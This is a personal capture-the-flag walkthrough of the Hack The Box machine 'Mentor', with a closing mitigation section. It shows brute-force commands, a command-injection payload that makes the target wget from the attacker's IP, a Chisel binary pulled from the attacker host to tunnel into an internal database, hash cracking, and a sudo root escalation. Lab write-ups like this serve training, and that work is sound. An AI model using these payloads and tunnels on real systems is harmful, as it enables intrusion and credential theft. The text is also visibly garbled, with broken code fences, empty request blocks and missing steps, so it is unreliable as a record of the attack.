This machine took me a long time to own because I failed at basic enumeration. Most of the work to do this box was in finding the passwords laying around.

* Room: Mentor
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Mentor](https://app.hackthebox.com/machines/Mentor)
* Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration

I began by launching Rustscan to find open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
```

It found two ports:
* 22 (SSH)
* 80 (HTTP)

Nmap showed that the HTTP server was redirecting to 'http://mentorquotes.htb/' so I added the domain to my hosts file.

I ran Feroxbuster on the site.

```bash
$ feroxbuster -u http://mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

It did not find anything of interest. I used wfuzz to look for subdomains.

```

It found 'api.mentorquotes.htb'.

## Website

I opened a browser to look at the website.

![Website](/assets/images/Mentor/MentorSite.png "Website")

It was a very simple website that showed some quotes. It appeared to have only one page. I looked at the source, and the requests it made. I did not see anything to exploit.

## API

I started looking at the API. Feroxbuster showed me that there was something on '/docs', so I looked at this first.

![API Doc](/assets/images/Mentor/APIDoc.png "API Doc")

It contained the [Swagger documentation](https://swagger.io/) of the API. The API was simple, having endpoints to authenticate, manage users, and manage quotes. Ferobuster also found an '/admin/' endpoint that was not documented.

The API had an endpoint to signup. I used it to create a user.

```http
POST /auth/signup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Content-Length: 83

{
  "email": "eric@test.htb",
  "username": "test1",
  "password": "12345678"
}
```

It worked.

```http

Connection: Keep-Alive

{
  "id": 4,
  "email": "eric@test.htb",
  "username": "test1"
}
```

I then logged in as the new user.

```http

```

It gave me a JWT. I added it to my requests and tried the different API endpoints. I was able to get the quotes, but every other call failed.

```json
{
  "detail": "Only admin users can access this resource"
}
```

The documentation page contained an email, I tried to use it to create a new user.

```http
POST /auth/signup HTTP/1.1

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "12345678",
  "admin": 1,
  "isAdmin": 1
}
```

This told me that the user already existed.

```json
{
  "detail": "User already exists! "
}
```

I tried using Hydra to brute force the password for james. And I tried to brute-force the key to sign the JWT with hashcat. They both failed.

```bash
$ hydra -l james -P /usr/share/seclists/rockyou.txt -u -e snr  -m "/auth/login:{\"email\"\:\"james@mentorquotes.htb\",\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:200 OK:H=Content-Type: application/json" api.mentorquotes.htb http-post-form

$ hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzICIsImVtYWlsIjoiamFtZXNAbWVudG9ycXVvdGVzLmh0YiJ9._Oh3hzsiflgbMWcFjZGF33bxTCt263o0vl5m6hqFqaU /usr/share/seclists/rockyou.txt
```

I lost a lot of hours trying to break the API. Eventually, I looked for a hint on the HTB forum and saw something about UDP. I really need to start scanning UDP all the time.

```bash
$ sudo nmap -sU target -oN nampUdp.txt
[sudo] password for ehogue:

```

[Simple Network Management Protocol (SNMP)](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol) was open. I tried scanning it with multiple tools. But I did not find anything of interest.

I used hydra to scan for other community strings. But it kept on finding only 'public'.

```bash
$ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.htb snmp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

Eventually, I realized that it was ending too quickly. I was not giving it the `-f` parameter, so I did not think it was supposed to stop after it found the first match, but it did.

I moved 'public at the end of my wordlist and tried again with SNMP versions 1 and 2.

```bash
$ hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt target.htb snmp -m '2'

It found a script running on the server, with what looked like a password in the command line.

I used the password to connect as james.

I used the returned JWT to try the requests that were rejected earlier.

I was able to extract users.

```

I tried creating quotes with [Server Side Template Injection (SSTI) payloads](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect).


```http

}
```

The payload was accepted and reflected in the response, but not executed. I looked at the first website. The new quote was there, but again not executed.


## Admin API

I remembered the undocumented admin endpoint found by Feroxbuster. I tried it again with james' JWT.

```http

```

It showed 2 additional endpoints. I tried '/admin/check', the response said that it was not implemented yet.

I tried the '/admin/backup' endpoint. It required a path.

I thought this might be creating backups through some command line, so I tried to get code execution.

```http

{
"path": "/etc/passwd; wget 10.10.14.8"
}
```

It worked, but the backup file name was appended at the end of my command.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.10.11.193 - - [03/Mar/2023 07:45:05] "GET /app_backkup.tar HTTP/1.1" 404 -
```

I added a semicolon and a '#' to comment out the rest of the command.

```json
{
"path": "/etc/passwd; wget 10.10.14.8 ; #"
}
```

This time it requested only what I asked.

```bash
10.10.11.193 - - [03/Mar/2023 07:47:19] "GET / HTTP/1.1" 200 -
```

I knew I could get code execution. I tried my usual reverse shell, but it failed. Bash was not installed on the server. I tried a different reverse shell using sh.

```http

This one worked.

```bash

## User svc

I was in a Docker container. I found some database credentials in the website code, in '/app/app/db.py'.

```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)

...
```

I could not connect to the database from the container, it did not have any Postgres client installed. I used [Chisel](https://github.com/jpillora/chisel) to create a tunnel between the container and my Kali VM so I could connect to the database from my machine.

I started a Chisel server on my machine.

```bash
./chisel server -p 3477 --reverse
```

Then I downloaded Chisel in the container and launched it. I ran it as a client to send traffic on port 5432 on my machine to the same port on the database server.

```bash
wget 10.10.14.11/chisel
Connecting to 10.10.14.11 (10.10.14.11:80)
chisel               100% |********************************| 8188k  0:00:00 ETA

chmod +x chisel

./chisel client 10.10.14.11:3477 R:5432:172.22.0.1:5432/tcp
```

Back on my machine, I connected to Postgres through the reverse tunnel.

```
psql postgresql://postgres:postgres@localhost/mentorquotes_db
```

Then I looked at what the database contained.

```sql
mentorquotes_db=# \dt
          List of relations

```

I already knew james' password. I used Hashcat to crack the password for svc.

```bash
$ cat hash.txt

The password was cracked in a few seconds. I used it to ssh to the server as svc.

## User james

This one took me a lot of time to get. I started by looking at the common things. I could not run sudo, and did not find any interesting suid binaries. I also check for files with capabilities, but again nothing.

I checked for cronjobs.

```
svc@mentor:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
# 10 * * * *  sleep 30; /usr/local/bin/login.py 'kj23sadkj123as0-d213'
```

There was a commented-out cronjobs. This was the command I saw in SNMP that gave me the password to use in the API. I retried the password as james and root. It failed.

I checked the script content.

```python
#!/usr/bin/python3
import requests, time
import sys, os

user = 'james'
passw = sys.argv[1]

json_data = {
    'email': f'{user}@mentorquotes.htb',
    'username': user,
    'password': passw,
}

while True:
        response = requests.post('http://172.22.0.1:8000/auth/login', json=json_data)

        if 'Not authorized!' in response:
                os.system(f"echo [{time.asctime()}] FAILED LOGIN! >> /root/logins.log")

        time.sleep(20)
```

The code was writting to a file in '/root'. That looked really promising, maybe it was being run as root. I was able to write to it, so I added a line to create a file in '/tmp'. I also ran [pspy](https://github.com/DominicBreuker/pspy) to find out if I could see it executed. It was not.

I ran [linPEAS](https://github.com/carlospolop/PEASS-ng) on the server and did not see anything in the results. I tried to find modified files all over the file system. 

Eventually, I looked at the configuration for the running services. The Apache and sshd configuration had nothing special. But when I got to the SNMP configuration, I finally saw it.


```bash
svc@mentor:~$ cat /etc/snmp/snmpd.conf
...

createUser bootstrap MD5 REDACTED DES
rouser bootstrap priv

...
```

I contained a password. I used it to 'su' as james.

```bash
svc@mentor:~$ su james
Password:

james@mentor:/home/svc$ 
```


## root

Once connected as james, getting root was very easy.

```bash
james@mentor:/home/svc$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh

james@mentor:~$ sudo /bin/sh

# cat /root/root.txt
REDACTED
```

## Mitigation

The biggest issue with that box is the passwords. There are passwords all over, and they are reused. There is a password used on the command line that allowed me to connect to the API. The password that svc uses for the API is the same one they use to connect to the server. That password is also hashed using a very weak algorithm (MD5). It took hashcat 15 seconds to crack it in an underprovisioned VM. And james' password was in clear in a configuration file that anyone could read. This user had permission to do anything they wanted on the server. Their password should have been a lot stronger than what they used, and it should never appear anywhere on the server.

I do not know much about SNMP. I never used it. But a quick search tells me that only SNMPv3 should be used as it allows authentication and encrypting of the payloads. Also, it probably should not be accessible to unknown machines on the net.

The code used by the backup API did have any protection against command injection. It took user input and directly inserted it into a shell command.

```python
# Take a backup of the application
@router.post("/backup",dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def backup(payload: backup):
    os.system(f'tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)}')
    return {"INFO": "Done!"}
```

There was no validation of the 'path' variable. Using [subprocess](https://docs.python.org/3/library/subprocess.html#security-considerations) would have helped prevent command injection. But a better solution would have been to not use input from the user. Why allow them to write backups anywhere they want?
